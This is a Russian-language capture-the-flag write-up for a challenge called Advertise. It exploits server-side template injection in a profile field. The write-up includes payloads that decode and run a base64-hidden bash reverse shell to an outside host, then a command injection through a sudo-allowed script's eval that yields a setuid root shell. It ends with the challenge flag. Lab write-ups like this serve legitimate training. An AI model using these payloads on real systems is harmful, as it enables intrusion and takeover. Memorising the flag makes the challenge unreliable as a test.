# Advertise

## Описание

I love advertising portals so much...

| Название | Сложность | Автор |
|------|-----|-------|
| Advertise | Easy |[@collapsz](https://t.me/collapsz) |

## TLDR

SSTI to RCE, CMDinjection to root

## Решение

Проходим регистрацию в приложении и смотрим что там есть – список объявлений и профиль. 

<img width="1676" alt="изображение" src="https://github.com/user-attachments/assets/28835727-afc4-4354-b607-9be373ed2ce8" />

Пару раз убив машину скульмапом понимаем, что никакой инъекции там нет и двигаемся на страницу профиля:

<img width="972" alt="изображение" src="https://github.com/user-attachments/assets/61c9ca84-1426-4859-96e3-1cb46fc1a46a" />

Имеем отражаемое поле о себе, вставив в которое `{{7*7}}` получим 49 – SSTI. Далее дело за малым:

<img width="1126" alt="изображение" src="https://github.com/user-attachments/assets/f306a7a3-954e-4e6c-8fe0-8023fe2bbf27" />

```
{{self.__init__.__globals__.__builtins__.__import('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE0Ny40NS4xMzcuMTY0LzkwMDEgMD4mMQo= | base64 -d > shell.sh').read()}}
{{self.__init__.__globals__.__builtins__.__import('os').popen('bash shell.sh').read()}}
```

Получаем шелл:

```
┌[root☮4193239-at57219]-(~)
└> nc -lvnp 9001             
Listening on [0.0.0.0] (family 0, port 9001)
Connection from 62.76.6.79 62521 received!
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
grimes@3994eeba6de9:/app$ 
```

Проверив sudoers, видим возможность выполнять скрипт admin.sh без пароля

```
grimes@3994eeba6de9:/app$ sudo -l
sudo -l
Matching Defaults entries for grimes on 3994eeba6de9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User grimes may run the following commands on 3994eeba6de9:
    (ALL) NOPASSWD: /home/grimes/admin.sh
```

Содержимое:

```
#!/bin/bash

show_header() {
    echo -e "\n\033[1;34m===== SYSTEM MONITOR =====\033[0m"
}

show_menu() {
    echo "

1. General system information

2. CPU information

3. Memory usage

4. List kernel modules

5. Exit"
}

cpu_info() {
    echo -e "\n\033[1;32m* CPU Information *\033[0m"
    lscpu | grep -E 'Model|Architecture|CPU(s)|CPU MHz'
}

memory_usage() {
    echo -e "\n\033[1;32m* Memory Usage *\033[0m"
    free -h | awk '/Mem/{printf "Total: %s, Used: %s, Free: %s\n", $2, $3, $4}'
}

system_info() {
    echo -e "\n\033[1;32m* General Information *\033[0m"
    echo "Hostname: $(hostname)"
    echo "Uptime: $(uptime -p)"
    echo "Kernel Version: $(uname -r)"
}

kernel_modules() {
    read -p "Enter arguments for filtering (or press Enter to skip): " user_args
    echo -e "\n\033[1;32m* Kernel Modules (filtering: ${user_args:-no filters}) *\033[0m"

    eval ls $user_args /sys/module 2>/dev/null || echo " No results"
}

main() {
    while true; do
        show_header
        show_menu
        read -p "Choose an action: " choice

        case $choice in
            1) system_info ;;
            2) cpu_info ;;
            3) memory_usage ;;
            4) kernel_modules ;;
            5) exit 0 ;;
            *) echo "Invalid choice!" ;;
        esac

        read -p "Press Enter to continue..."
    done
}
```

Запускаем скрипт и выполняем CMD injection

```
===== SYSTEM MONITOR =====


1. General system information

2. CPU information

3. Memory usage

4. List kernel modules (vulnerable function)

5. Exit
4
;cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

Далее 

```
grimes@3994eeba6de9:/app$ /tmp/bash -p
/tmp/bash -p
id
uid=1000(grimes) gid=1000(grimes) euid=0(root) egid=0(root) groups=0(root),1000(grimes)
```
PWNed!
## Flag
rdg{1c7d711f1ac4c57d5b074a1b4ea50770}
